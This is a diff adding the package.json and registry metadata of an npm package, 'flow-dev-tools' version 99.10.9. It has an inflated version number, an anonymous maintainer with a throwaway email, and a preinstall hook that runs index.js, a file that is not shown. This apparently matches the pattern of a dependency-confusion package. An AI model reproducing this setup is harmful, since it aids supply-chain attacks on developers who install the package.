@@ -1,0 +1,39 @@
+{
+    "name": "flow-dev-tools",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "flow-dev-tools@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-kJlgHi5VaQ7kCYatgpU+LakewwXPT/0wdQ8BxF9FrVmPQrkByayAUv312hetCQALdcHQCXSvPcjoT6KtF9RFQA==",
+        "shasum": "4a6284b15f87cfe8ff6df0360efaa82adc5901e5",
+        "tarball": "https://registry.npmjs.org/flow-dev-tools/-/flow-dev-tools-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5066,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPH23ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmr0fxAAgR01o6z04eGc8KKMFwtKCSl6/cMO0o0dqk/XVNst7LhZ7PGA\r\n+N4yvle9Jiet1I0oqHpIG1fZEuSPCjUhmqtIry9q+Qx4RD7NP30JOImqz5og\r\nANEaYo5nrkeEdTa9HIVFsmQrWqAVP2VI+CeClaUUNqoJN+7Fbpseb6divxgR\r\naVcCJFzn9LCvxYwp6FVZtgvDlOMj7eIzUQKIZYuetvxbz81yrCZDID2OFkwc\r\n2c7FdBKeG3K+2fMDvc8qnMFSJ09BxrGXPv5wflYHES5NGespX/T202J4n5mN\r\nKzhIoki9uARpQrMlFeTgSOgo0MJ7H65np5XqE/qcrArodueXkoX5fxJtEbMD\r\nrxZS2nyu/UV9+iVFXz1S2OoDx4IGJNbv73/ITUdeNFWpixBPM56yJYFKUTXB\r\n8BN4wlmU2odHnEY6JkjHNwIchciOZ+85cAOfJz3xoqHmDugIjt7YR8A2FUAE\r\nJizjIfnBG42Ht6B88Ot8eKD5hTKIKK3luA9LaTumDjM/ipUIUEVnL2YzhHsi\r\nhc8C4/Sd/zNbCBAq5UbzIb5uYmashgR14hmuFJjzLmOkDiKT5Kj6tJa7gLKs\r\nYTz47dTrABboKmZVbxDIHRHqzxQaVAyz5cY0CSR9PVFBqTJnNaKYcdg4rYRR\r\nk5vutCnZWgVnbdu7JrJQDXM3hVcHy89q1ow=\r\n=u2kd\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "64613d81",
+        "email": "64613d81@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "64613d81",
+            "email": "64613d81@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/flow-dev-tools_99.10.9_1648131511150_0.09138963908628694"
+    },
+    "_hasShrinkwrap": false
+}
